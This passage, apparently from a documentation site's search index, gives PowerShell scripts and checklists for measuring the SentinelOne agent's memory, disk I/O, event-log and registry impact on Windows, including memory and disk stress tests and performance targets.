Measure-Object VirtualMemorySize -Sum).Sum / 1MB\nWrite-Host \"Total SentinelOne Working Set: $([math]::Round($totalWorkingSet, 2)) MB\"\nWrite-Host \"Total SentinelOne Virtual Memory: $([math]::Round($totalVirtual, 2)) MB\"\n\n# Memory usage monitoring over time (5 minutes)\nWrite-Host \"=== Memory Usage Monitoring (5 minutes) ===\" -ForegroundColor Yellow\nfor ($i = 1; $i -le 60; $i++) {\n    $timestamp = Get-Date -Format \"HH:mm:ss\"\n    $processes = Get-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"}\n    $currentWS = ($processes | Measure-Object WorkingSet -Sum).Sum / 1MB\n    $systemAvail = (Get-Counter \"\\Memory\\Available MBytes\").CounterSamples[0].CookedValue\n\n    Write-Host \"$timestamp - SentinelOne Memory: $([math]::Round($currentWS, 2)) MB, System Available: $([math]::Round($systemAvail, 2)) MB\"\n    Start-Sleep 5\n}\n</code></pre>"},{"location":"testing/windows/windows-performance/#e22-memory-stress-testing-with-agent","title":"E2.2: Memory Stress Testing with Agent","text":"<pre><code># Memory stress testing with SentinelOne agent\nWrite-Host \"=== Memory Stress Testing ===\" -ForegroundColor Green\n\n# Baseline memory usage\nWrite-Host \"Baseline memory usage:\" -ForegroundColor Yellow\nGet-Counter \"\\Memory\\Available MBytes\", \"\\Memory\\% Committed Bytes In Use\" | \n    Select-Object -ExpandProperty CounterSamples | \n    Format-Table Path, CookedValue\n\n# Memory stress test function\nfunction Start-MemoryStressTest {\n    param(\n        [string]$TestName,\n        [int]$DurationSeconds,\n        [int]$MemoryMB\n    )\n\n    Write-Host \"=== $TestName ===\" -ForegroundColor Yellow\n\n    # Start memory monitoring\n    $monitorJob = Start-Job -ScriptBlock {\n        param($duration)\n        for ($i = 1; $i -le $duration; $i++) {\n            $mem = Get-Counter \"\\Memory\\Available MBytes\", \"\\Memory\\% Committed Bytes In Use\"\n            $available = $mem.CounterSamples[0].CookedValue\n            $committed = $mem.CounterSamples[1].CookedValue\n            $timestamp = Get-Date -Format \"HH:mm:ss\"\n            Write-Output \"$timestamp - Available: $([math]::Round($available, 0)) MB, Committed: $([math]::Round($committed, 2))%\"\n            Start-Sleep 1\n        }\n    } -ArgumentList $DurationSeconds\n\n    # Memory stress test\n    Write-Host \"Allocating $MemoryMB MB of memory...\"\n    $memoryArrays = @()\n    $chunkSize = 10MB\n    $chunks = [math]::Floor($MemoryMB * 1MB / $chunkSize)\n\n    for ($i = 1; $i -le $chunks; $i++) {\n        $memoryArrays += New-Object byte[] $chunkSize\n        if ($i % 10 -eq 0) {\n            Write-Progress -Activity \"Allocating Memory\" -Status \"$i/$chunks chunks allocated\" -PercentComplete (($i / $chunks) * 100)\n        }\n        Start-Sleep -Milliseconds 100\n    }\n\n    Write-Host \"Memory allocated, holding for $DurationSeconds seconds...\"\n    Start-Sleep $DurationSeconds\n\n    # Release memory\n    $memoryArrays.Clear()\n    [System.GC]::Collect()\n    [System.GC]::WaitForPendingFinalizers()\n    [System.GC]::Collect()\n\n    # Stop monitoring and get results\n    $monitorJob | Wait-Job\n    $results = $monitorJob | Receive-Job\n    $monitorJob | Remove-Job\n\n    Write-Host \"Memory test results for $TestName:\"\n    $results | Select-Object -Last 10\n\n    # Check SentinelOne agent stability\n    Write-Host \"SentinelOne agent status after $TestName:\" -ForegroundColor Yellow\n    $agentStatus = &amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n    if ($agentStatus -match \"running\") {\n        Write-Host \"\u2705 Agent remained stable during memory stress\" -ForegroundColor Green\n    } else {\n        Write-Host \"\u26a0\ufe0f  Agent status needs verification\" -ForegroundColor Yellow\n    }\n}\n\n# Run different memory stress scenarios\nStart-MemoryStressTest -TestName \"Moderate Load\" -DurationSeconds 60 -MemoryMB 512\nStart-Sleep 10\nStart-MemoryStressTest -TestName \"Heavy Load\" -DurationSeconds 120 -MemoryMB 1024\n\nWrite-Host \"=== Memory Impact Summary ===\" -ForegroundColor Yellow\nWrite-Host \"Check if SentinelOne agent maintained stability during memory pressure\"\n</code></pre>"},{"location":"testing/windows/windows-performance/#e3-disk-io-performance-testing","title":"\ud83d\udcbe E3: Disk I/O Performance Testing","text":""},{"location":"testing/windows/windows-performance/#e31-disk-io-baseline-and-impact","title":"E3.1: Disk I/O Baseline and Impact","text":"<pre><code># Windows Disk I/O performance testing\nWrite-Host \"=== Disk I/O Performance Testing ===\" -ForegroundColor Green\n\n# System disk information\nWrite-Host \"Disk Information:\" -ForegroundColor Yellow\nGet-WmiObject -Class Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | \n    Select-Object DeviceID, \n    @{Name=\"Size(GB)\"; Expression={[math]::Round($_.Size/1GB, 2)}}, \n    @{Name=\"FreeSpace(GB)\"; Expression={[math]::Round($_.FreeSpace/1GB, 2)}}, \n    @{Name=\"FileSystem\"; Expression={$_.FileSystem}} | \n    Format-Table\n\n# Function to run disk I/O tests\nfunction Start-DiskIOTest {\n    param(\n        [string]$TestName,\n        [string]$TestType,\n        [int]$FileSizeMB = 1000,\n        [int]$DurationSeconds = 60\n    )\n\n    Write-Host \"=== $TestName ===\" -ForegroundColor Yellow\n\n    # Start I/O monitoring\n    $ioCounters = @(\n        \"\\LogicalDisk(C:)\\Disk Reads/sec\",\n        \"\\LogicalDisk(C:)\\Disk Writes/sec\", \n        \"\\LogicalDisk(C:)\\Disk Read Bytes/sec\",\n        \"\\LogicalDisk(C:)\\Disk Write Bytes/sec\"\n    )\n\n    $monitorJob = Start-Job -ScriptBlock {\n        param($counters, $duration)\n        for ($i = 1; $i -le $duration; $i++) {\n            $stats = Get-Counter $counters -SampleInterval 1 -MaxSamples 1\n            $timestamp = Get-Date -Format \"HH:mm:ss\"\n            $reads = [math]::Round($stats.CounterSamples[0].CookedValue, 2)\n            $writes = [math]::Round($stats.CounterSamples[1].CookedValue, 2)\n            $readBytes = [math]::Round($stats.CounterSamples[2].CookedValue / 1MB, 2)\n            $writeBytes = [math]::Round($stats.CounterSamples[3].CookedValue / 1MB, 2)\n            Write-Output \"$timestamp - Reads: $reads/sec, Writes: $writes/sec, Read: $readBytes MB/s, Write: $writeBytes MB/s\"\n        }\n    } -ArgumentList $ioCounters, $DurationSeconds\n\n    # Monitor SentinelOne I/O impact\n    $sentinelMonitorJob = Start-Job -ScriptBlock {\n        param($duration)\n        for ($i = 1; $i -le $duration; $i++) {\n            $sentinelProcesses = Get-Process | Where-Object {$_.ProcessName -like \"*Sentinel*\"}\n            $totalReadOps = ($sentinelProcesses | Measure-Object ReadOperationCount -Sum).Sum\n            $totalWriteOps = ($sentinelProcesses | Measure-Object WriteOperationCount -Sum).Sum\n            $timestamp = Get-Date -Format \"HH:mm:ss\"\n            Write-Output \"$timestamp - SentinelOne IO - Reads: $totalReadOps, Writes: $totalWriteOps\"\n            Start-Sleep 1\n        }\n    } -ArgumentList $DurationSeconds\n\n    # Run I/O test based on type\n    $testFile = \"C:\\temp\\iotest_$TestType.dat\"\n    New-Item -Path \"C:\\temp\" -ItemType Directory -Force -ErrorAction SilentlyContinue\n\n    switch ($TestType) {\n        \"SequentialWrite\" {\n            Write-Host \"Running sequential write test...\"\n            $data = New-Object byte[] (1MB)\n            $stream = [System.IO.File]::Create($testFile)\n            for ($i = 1; $i -le $FileSizeMB; $i++) {\n                $stream.Write($data, 0, $data.Length)\n                if ($i % 100 -eq 0) {\n                    Write-Progress -Activity \"Sequential Write\" -Status \"$i/$FileSizeMB MB written\" -PercentComplete (($i / $FileSizeMB) * 100)\n                }\n            }\n            $stream.Close()\n        }\n        \"SequentialRead\" {\n            Write-Host \"Running sequential read test...\"\n            if (Test-Path $testFile) {\n                $buffer = New-Object byte[] (1MB)\n                $stream = [System.IO.File]::OpenRead($testFile)\n                $totalRead = 0\n                while ($totalRead -lt $stream.Length) {\n                    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)\n                    $totalRead += $bytesRead\n                    if ($totalRead % (100MB) -eq 0) {\n                        Write-Progress -Activity \"Sequential Read\" -Status \"$([math]::Round($totalRead/1MB, 0)) MB read\" -PercentComplete (($totalRead / $stream.Length) * 100)\n                    }\n                }\n                $stream.Close()\n            }\n        }\n        \"RandomIO\" {\n            Write-Host \"Running random I/O test...\"\n            # Create file first\n            fsutil file createnew $testFile ([long]$FileSizeMB * 1MB)\n\n            # Random access\n            $random = New-Object System.Random\n            $buffer = New-Object byte[] (4KB)\n            $stream = [System.IO.File]::Open($testFile, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)\n\n            for ($i = 1; $i -le 1000; $i++) {\n                $position = $random.Next(0, [int]($stream.Length - $buffer.Length))\n                $stream.Seek($position, [System.IO.SeekOrigin]::Begin) | Out-Null\n                $stream.Write($buffer, 0, $buffer.Length)\n\n                if ($i % 100 -eq 0) {\n                    Write-Progress -Activity \"Random I/O\" -Status \"$i/1000 operations\" -PercentComplete (($i / 1000) * 100)\n                }\n            }\n            $stream.Close()\n        }\n    }\n\n    # Wait for monitoring to complete\n    Start-Sleep 5\n    $monitorJob | Stop-Job\n    $sentinelMonitorJob | Stop-Job\n\n    # Get results\n    Write-Host \"I/O statistics for $TestName:\" -ForegroundColor Yellow\n    $ioResults = $monitorJob | Receive-Job\n    $ioResults | Select-Object -Last 10\n\n    Write-Host \"SentinelOne I/O impact during $TestName:\" -ForegroundColor Yellow\n    $sentinelResults = $sentinelMonitorJob | Receive-Job\n    $sentinelResults | Select-Object -Last 10\n\n    # Cleanup\n    $monitorJob | Remove-Job\n    $sentinelMonitorJob | Remove-Job\n    Remove-Item $testFile -ErrorAction SilentlyContinue\n}\n\n# Run various I/O tests\nStart-DiskIOTest -TestName \"Sequential Write\" -TestType \"SequentialWrite\" -FileSizeMB 500\nStart-Sleep 10\nStart-DiskIOTest -TestName \"Sequential Read\" -TestType \"SequentialRead\" -FileSizeMB 500\nStart-Sleep 10\nStart-DiskIOTest -TestName \"Random I/O\" -TestType \"RandomIO\" -FileSizeMB 100\n</code></pre>"},{"location":"testing/windows/windows-performance/#performance-impact-summary","title":"\ud83d\udcca Performance Impact Summary","text":""},{"location":"testing/windows/windows-performance/#expected-performance-targets","title":"Expected Performance Targets","text":"Metric Target Impact Acceptable Range CPU Usage &lt; 5% average &lt; 10% peak Memory Usage &lt; 300MB RSS &lt; 500MB RSS Disk I/O Overhead &lt; 15% &lt; 25% Network Bandwidth &lt; 1MB/s &lt; 2MB/s"},{"location":"testing/windows/windows-performance/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/windows/windows-performance/#cpu-performance","title":"CPU Performance","text":"<ul> <li>[ ] Baseline CPU: Benchmark results recorded without agent</li> <li>[ ] Agent CPU Impact: CPU overhead &lt; 5% during normal operations</li> <li>[ ] Stress Test Stability: Agent remains stable under CPU stress</li> <li>[ ] Real-time Scanning: File scanning CPU impact &lt; 10%</li> </ul>"},{"location":"testing/windows/windows-performance/#memory-performance","title":"Memory Performance","text":"<ul> <li>[ ] Memory Footprint: Agent working set &lt; 300MB</li> <li>[ ] Memory Stability: No memory leaks over 24 hours</li> <li>[ ] Stress Test Resilience: Agent survives memory pressure tests</li> <li>[ ] Growth Rate: Memory growth &lt; 1MB/hour</li> </ul>"},{"location":"testing/windows/windows-performance/#disk-io-performance","title":"Disk I/O Performance","text":"<ul> <li>[ ] I/O Overhead: Disk I/O impact &lt; 15%</li> <li>[ ] Real-time Scanning: File scanning I/O overhead acceptable</li> <li>[ ] Batch Operations: Large file operations don't overwhelm system</li> <li>[ ] Log Management: Agent logs don't consume excessive disk space</li> </ul>"},{"location":"testing/windows/windows-performance/#windows-specific-performance-considerations","title":"Windows-Specific Performance Considerations","text":""},{"location":"testing/windows/windows-performance/#event-log-impact","title":"Event Log Impact","text":"<pre><code># Monitor Windows Event Log performance\nWrite-Host \"=== Event Log Performance Monitoring ===\" -ForegroundColor Green\n\n# Check event log sizes\nGet-WinEvent -ListLog * | Where-Object {$_.LogName -like \"*SentinelOne*\"} |\n    Select-Object LogName, RecordCount, FileSize, IsEnabled |\n    Format-Table\n\n# Monitor event log write performance\n$eventCounters = @(\n    \"\\Windows Event Log(*)\\Events/sec\"\n)\n\nfor ($i = 1; $i -le 60; $i++) {\n    $events = Get-Counter $eventCounters -ErrorAction SilentlyContinue\n    if ($events) {\n        $timestamp = Get-Date -Format \"HH:mm:ss\"\n        $eventsPerSec = ($events.CounterSamples | Measure-Object CookedValue -Sum).Sum\n        Write-Host \"$timestamp - Total Events/sec: $([math]::Round($eventsPerSec, 2))\"\n    }\n    Start-Sleep 5\n}\n</code></pre>"},{"location":"testing/windows/windows-performance/#registry-performance-impact","title":"Registry Performance Impact","text":"<pre><code># Monitor registry performance\nWrite-Host \"=== Registry Performance Monitoring ===\" -ForegroundColor Green\n\n$registryCounters = @(\n    \"\\Registry\\Registry Writes/sec\",\n    \"\\Registry\\Registry Reads/sec\"\n)\n\nfor ($i = 1; $i -le 60; $i++) {\n    $registry = Get-Counter $registryCounters -ErrorAction SilentlyContinue\n    if ($registry) {\n        $timestamp = Get-Date -Format \"HH:mm:ss\"\n        $writes = $registry.CounterSamples[0].CookedValue\n        $reads = $registry.CounterSamples[1].CookedValue\n        Write-Host \"$timestamp - Registry Writes/sec: $([math]::Round($writes, 2)), Reads/sec: $([math]::Round($reads, 2))\"\n    }\n    Start-Sleep 5\n}\n</code></pre>"},{"location":"testing/windows/windows-performance/#next-steps","title":"Next Steps","text":"<p>Continue with: - Windows Offline Testing - Windows Enterprise Testing - Cross-Platform Performance Comparison</p> <p>Last updated: 6 Agustus 2025</p>"}]}